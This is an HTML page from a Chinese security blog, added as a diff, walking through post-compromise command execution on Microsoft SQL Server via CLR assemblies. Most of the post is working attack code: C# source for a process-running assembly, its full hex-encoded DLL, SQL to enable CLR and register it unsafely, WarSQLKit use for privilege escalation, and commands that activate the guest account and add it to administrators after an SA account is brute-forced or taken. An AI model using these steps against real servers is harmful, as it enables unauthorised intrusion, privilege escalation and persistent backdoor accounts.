@@ -1,0 +1,672 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="EvilAnne,黑客学习,黑客笔记,二进制,Linux运维,Hexo,博客" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLServer CLR">
+<meta property="og:url" content="http://yoursite.com/2020/06/26/SQLServer-CLR/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description">
+<meta property="og:image" content="https://i.imgur.com/XLTTgzr.jpg">
+<meta property="og:image" content="https://i.imgur.com/LHs3NPt.png">
+<meta property="og:image" content="https://i.imgur.com/pOddyjr.png">
+<meta property="og:image" content="https://i.imgur.com/YDmmLpr.png">
+<meta property="og:image" content="https://i.imgur.com/nfU2MEa.png">
+<meta property="og:image" content="https://i.imgur.com/EK924Eh.jpg">
+<meta property="og:image" content="https://i.imgur.com/T58sqvw.jpg">
+<meta property="og:image" content="https://i.imgur.com/yeBVw4c.jpg">
+<meta property="og:image" content="https://i.imgur.com/QG0RqmA.jpg">
+<meta property="og:updated_time" content="2020-06-26T14:47:02.188Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLServer CLR">
+<meta name="twitter:description">
+<meta name="twitter:image" content="https://i.imgur.com/XLTTgzr.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> SQLServer CLR | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/evilanne" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SQLServer CLR
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2020-06-26T22:39:23+08:00" content="2020-06-26">
+              2020-06-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2020/06/26/SQLServer-CLR/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2020/06/26/SQLServer-CLR/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p> <img src="https://i.imgur.com/XLTTgzr.jpg" alt=""></p>
+ <a id="more"></a>
+<p>CLR称为公共语言运行库，在<code>Server 2005 - 2016</code>都可以使用，通过CLR来创建存储过程，执行.NET代码。</p>
+<h2 id="实战SQLServer-2008"><a href="#实战SQLServer-2008" class="headerlink" title="实战SQLServer 2008"></a>实战SQLServer 2008</h2><p>一般爆破或者拿到SA帐号之后，通过SQLTOOL连接执行命令，其实就是通过<code>xp_cmdshell</code>来执行，而xp_cmdshell默认是关闭的，通过以下语句来开启：<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></p>
+<p>那么经常在实战中会遇到：</p>
+<ul>
+<li>sa无法执行命令；</li>
+<li>提示网络错误；</li>
+</ul>
+<p>拿到SA权限之后，通过SQLTOOLS工具去连接，然后执行命令出现了如下错误：一般性网络错误。<br><img src="https://i.imgur.com/LHs3NPt.png" alt="4FE2DD5C-4FED-4E3C-8F7A-85A842280A8D-w766"></p>
+<p>但是发现这个SQLServer能列目录或者执行SQL语句：<br><img src="https://i.imgur.com/pOddyjr.png" alt="DAD427CA-6168-44F6-8D06-13500342E2B1-w678"></p>
+<p><img src="https://i.imgur.com/YDmmLpr.png" alt="51027583-BACA-47BE-9DC2-FE2450171917-w327"></p>
+<p>看到有360的目录，可能就是这个原因，360会拦截执行命令。</p>
+<p>利用流程：<br><code>写一个DLL -&gt; 编译DLL -&gt; 转换为16进制 -&gt; SSMS工具连接 -&gt; 开启SQLServer CLR -&gt; 创建存储过程 -&gt; 执行命令 -&gt; 关闭CLR</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">using System; using System.Data;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server; using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace Hi.Test&#123;</span><br><span class="line">public class SQLClr&#123;</span><br><span class="line">public static string Run(string proc,string arg)&#123;</span><br><span class="line">try &#123;</span><br><span class="line">Process p=new Process(); p.StartInfo.FileName=proc; p.StartInfo.Arguments=arg;</span><br><span class="line">p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.RedirectStandardError=true; p.Start();</span><br><span class="line">p.WaitForExit();</span><br><span class="line">return p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception ex) &#123;</span><br><span class="line">return ex.ToString(); &#125;</span><br><span class="line">&#125;</span><br><span class="line">public static void RunProc(string proc,string arg) &#123;</span><br><span class="line">SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;ret&quot;,SqlDbType.NVarChar,4000)); SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line">record.SetString(0,Run(proc,arg));</span><br><span class="line">SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line">SqlContext.Pipe.SendResultsEnd();</span><br><span class="line">&#125;</span><br><span class="line">public static string ProcessArch() &#123;</span><br><span class="line">return Marshal.SizeOf(typeof(IntPtr))==8?&quot;x64&quot;:&quot;x86&quot;;</span><br><span class="line">&#125;</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>利用csc.exe生成dll<br><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /target:library c:\exec.cs</code></p>
+<p>Powershell将dll转换16进制：<br><code>exec.ps1</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$assemblyFile</span> = <span class="string">"c:\exec.dll”</span><br><span class="line"></span><br><span class="line"><span class="variable">$stringBuilder</span> = New-Object -Type System.Text.StringBuilder</span><br><span class="line"><span class="variable">$stringBuilder</span>.Append("</span>CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x<span class="string">") | Out-Null</span><br><span class="line"></span><br><span class="line"><span class="variable">$fileStream</span> = [IO.File]::OpenRead(<span class="variable">$assemblyFile</span>) </span><br><span class="line">while ((<span class="variable">$byte</span> = <span class="variable">$fileStream</span>.ReadByte()) -gt -1) &#123; <span class="variable">$stringBuilder</span>.Append(<span class="variable">$byte</span>.ToString("</span>X2<span class="string">")) | Out-Null &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>`nWITH PERMISSION_SET = UNSAFE<span class="string">") | Out-Null</span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>GO<span class="string">") | Out-Null</span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span> <span class="string">") | Out-Null</span><br><span class="line"></span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>CREATE PROCEDURE [dbo].[clr_exec] @execCommand NVARCHAR (<span class="number">4000</span>) AS [my_assembly].[StoredProcedures].[clr_exec];<span class="string">") | Out-Null</span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>GO<span class="string">") | Out-Null</span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span> <span class="string">") | Out-Null</span><br><span class="line"></span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>EXEC[dbo].[clr_exec] <span class="string">'whoami'</span><span class="string">") | Out-Null </span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span>GO<span class="string">") | Out-Null</span><br><span class="line"><span class="variable">$stringBuilder</span>.AppendLine("</span> <span class="string">") | Out-Null</span><br><span class="line"></span><br><span class="line"><span class="variable">$stringBuilder</span>.ToString() -join "</span><span class="string">" | Out-File c:\exec.txt</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass</span><br><span class="line">PS C:\Import-Module .\exec.ps1</span><br></pre></td></tr></table></figure>
+<p>SSMS连接数据库：<br>最好一步一步执行；</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use msdb;</span><br><span class="line">alter database master set trustworthy on;</span><br><span class="line">exec sp_configure <span class="string">'show advanced options'</span>,<span class="number">1</span>;reconfigure;exec sp_configure <span class="string">'clr enabled'</span>,<span class="number">1</span>;reconfigure;</span><br><span class="line"></span><br><span class="line">create assembly sysinfo from <span class="number">0</span>x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300F4ACF15E0000000000000000E00002210B010800000A00000006000000000000CE2800000020000000400000000040000020000000020000040000000000000004000000000000000080000000020000000000000300408500001000001000000000100000100000000000001000000000000000000000007828000053000000004000009802000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000D408000000200000000A000000020000000000000000000000000000200000602E72737263000000980200000040000000040000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001000000000000000000000000000004000004200000000000000000000000000000000B02800000000000048000000020005008C210000EC06000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B30020083000000010000110000730300000A0A066F0400000A026F0500000A00066F0400000A036F0600000A00066F0400000A166F0700000A00066F0400000A176F0800000A00066F0400000A176F0900000A00066F0A00000A26066F0B00000A00066F0C00000A6F0D00000A066F0E00000A6F0D00000A280F00000A0CDE0B0B00076F1000000A0CDE0000082A0001100000000001007475000B0900000113300600570000000200001100178D0A0000010B071672010000701F0C20A00F00006A731100000AA207731200000A0A281300000A066F1400000A000616020328010000066F1500000A00281300000A066F1600000A00281300000A6F1700000A002A0013300200240000000300001100D00F000001281800000A281900000A1E2E0772090000702B0572110000700A2B00062A1E02281B00000A2A42534A4201000100000000000C00000076322E302E35303732370000000005006C00000068020000237E0000D40200003C03000023537472696E677300000000100600001C000000235553002C0600001000000023475549440000003C060000B000000023426C6F620000000000000002000001471502140900000000FA01330016000001000000130000000200000005000000080000001B00000002000000030000000100000001000000010000000300000000000A00010000000000060032002B000600840064000600A40064000A00E300D0000A00EB00D00006008A0180010600AA0180010600D1012B000600E8012B000E001902FE010E002502F2010E002F02FE010E003D02FE010E004802FE01060092022B00060099022B0006009E022B000600E102C2020600F002C20200000000010000000000010001000100100013001A00050001000100502000000000960039000A000100F0200000000096003D00100003005421000000009600450016000500000000008000912051001A00050084210000000086185E002200090000000100C70000000200CC0000000100C70000000200CC00000001001003000002001C0300000300210300000400320311005E00260019005E00220021005E0022002100FC002B0029000A01300029001701300029002501350029003901350029005401350021006E013A00210074012200210097013E003900B50143002100BF013E004100D8010A000900DF01430051005E004F0061005E005700690050025E0071005902630061006A0269007100740263007100830222008100B00277009100E9027E0099005E00300009005E0022002E000B0088002E001300910047006F00840003030001090051000100048000000000000000000000000000000000C2000000020000000000000000000000010022000000000002000000000000000000000001002B00000000000200000000000000000000000100F201000000000000003C4D6F64756C653E00657865632E646C6C0053514C436C720048692E54657374006D73636F726C69620053797374656D004F626A6563740052756E0052756E50726F630050726F6365737341726368005669727475616C416C6C6F63002E63746F720053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500657865630070726F63006172670053797374656D2E446961676E6F73746963730050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65007365745F417267756D656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172644F7574707574007365745F52656469726563745374616E646172644572726F720053746172740057616974466F72457869740053797374656D2E494F0053747265616D526561646572006765745F5374616E646172644F757470757400546578745265616465720052656164546F456E64006765745F5374616E646172644572726F7200537472696E6700436F6E63617400546F537472696E6700457863657074696F6E0053797374656D2E44617461004D6963726F736F66742E53716C5365727665722E5365727665720053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C7473537461727400536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E6400496E7450747200547970650052756E74696D655479706548616E646C65004765745479706546726F6D48616E646C650053797374656D2E52756E74696D652E496E7465726F705365727669636573004D61727368616C0053697A654F6600446C6C496D706F7274417474726962757465006B65726E656C33322E646C6C006C705374617274416464720073697A6500666C416C6C6F636174696F6E5479706500666C50726F7465637400000772006500740000077800380036000007780036003400000000009C014C7808607A42A022448774088A6B0008B77A5C561934E0890500020E0E0E050002010E0E0300000E07000418180909090320000104200101080420001215042001010E04200101020320000204200012190320000E070703121112250E072003010E112D0A062001011D1229040000123905200101123105200201080E07070212311D1229060001124111450500010812410307010E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301A02800000000000000000000BE280000002000000000000000000000000000000000000000000000B028000000000000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000003C02000000000000000000003C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0049C010000010053007400720069006E006700460069006C00650049006E0066006F0000007801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000034000900010049006E007400650072006E0061006C004E0061006D006500000065007800650063002E0064006C006C00000000002800020001004C006500670061006C0043006F0070007900720069006700680074000000200000003C00090001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000065007800650063002E0064006C006C0000000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000D03800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 with permission_set=unsafe;</span><br><span class="line"></span><br><span class="line">create procedure sysinfo_run_proc(@proc nvarchar(max),@arg nvarchar(max)) as external name sysinfo.[Hi.Test.SQLClr].RunProc;</span><br><span class="line">create <span class="keyword">function</span> sysinfo_run(@proc nvarchar(max),@arg nvarchar(max)) returns nvarchar(max) as external name sysinfo.[Hi.Test.SQLClr].Run;</span><br><span class="line"></span><br><span class="line">select msdb.dbo.sysinfo_run(<span class="string">'query'</span>,<span class="string">'user'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/nfU2MEa.png" alt="067AFE83-F963-4A40-AD1A-972158AB01B9-w895"></p>
+<p>删除并且关闭；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sysinfo_run;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> sysinfo_run_proc;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">assembly</span> sysinfo;</span><br><span class="line"></span><br><span class="line">exec sp_configure 'clr enabled',0;RECONFIGURE WITH OVERRIDE;exec sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',0;RECONFIGURE WITH OVERRIDE;</span></span><br></pre></td></tr></table></figure>
+<p>除了用16进制外，通过SSMS上传dll<br><img src="https://i.imgur.com/EK924Eh.jpg" alt=""></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ASSEMBLY</span> sp_cmdExec</span><br><span class="line"><span class="keyword">FROM</span> <span class="string">'C:\ProgramData\WarSQLKit.dll'</span></span><br><span class="line"><span class="keyword">WITH</span> PERMISSION_SET = <span class="keyword">UNSAFE</span></span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sp_cmdExec</span><br><span class="line">@Command [<span class="keyword">nvarchar</span>](<span class="number">4000</span>)</span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">EXECUTE</span> <span class="keyword">AS</span> CALLER</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> <span class="keyword">NAME</span> WarSQLKit.StoredProcedures.CmdExec</span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line">EXEC sp_cmdExec <span class="string">'net user'</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="实战SQLServer-2012"><a href="#实战SQLServer-2012" class="headerlink" title="实战SQLServer 2012"></a>实战SQLServer 2012</h2><p>通过CLR执行命令后有些sa被降权了，然后利用WarSQLKit自带功能提权，经过测试WarSQLKit不能在SQLServer 2005 - 2008 使用，会出现错误。</p>
+<h3 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> msdb;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> <span class="keyword">master</span> <span class="keyword">set</span> trustworthy <span class="keyword">on</span>;</span><br><span class="line">exec sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1; RECONFIGURE WITH OVERRIDE;exec sp_configure '</span>clr enabled<span class="string">',1; RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">create assembly sp_cmdExec from 0x十六进制</span><br><span class="line">with permission_set=unsafe;</span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) </span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME sp_cmdExec.StoredProcedures.CmdExec </span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">exec sp_cmdExec '</span>sp_help<span class="string">';</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/T58sqvw.jpg" alt=""></p>
+<p>SA被降权<br><img src="https://i.imgur.com/yeBVw4c.jpg" alt=""></p>
+<p>尝试土豆提权<br><img src="https://i.imgur.com/QG0RqmA.jpg" alt=""></p>
+<p>必要的情况下可以开启guest提升为管理员：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec '"<span class="built_in">net</span> user guest /active:yes" /RunSystemPriv';</span><br><span class="line">exec sp_cmdExec '"<span class="built_in">net</span> user guest <span class="number">123</span>qwe!@#" /RunSystemPriv';</span><br><span class="line">exec sp_cmdExec '"<span class="built_in">net</span> localgroup administrators guest /add" /RunSystemPriv';</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/86455" target="_blank" rel="external">CLR在SQL Server中的利用技术分析</a></li>
+<li><a href="https://xz.aliyun.com/t/6682#toc-0" target="_blank" rel="external">MSSQL使用CLR程序集来执行命令</a></li>
+<li><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit" target="_blank" rel="external">WarSQLKit</a></li>
+<li><a href="https://www.cnblogs.com/backlion/p/12272799.html" target="_blank" rel="external">MSSQL无落地文件执行Rootkit-WarSQLKit</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/03/Linux-Nginx后门/" rel="next" title="Linux Nginx后门">
+                <i class="fa fa-chevron-left"></i> Linux Nginx后门
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
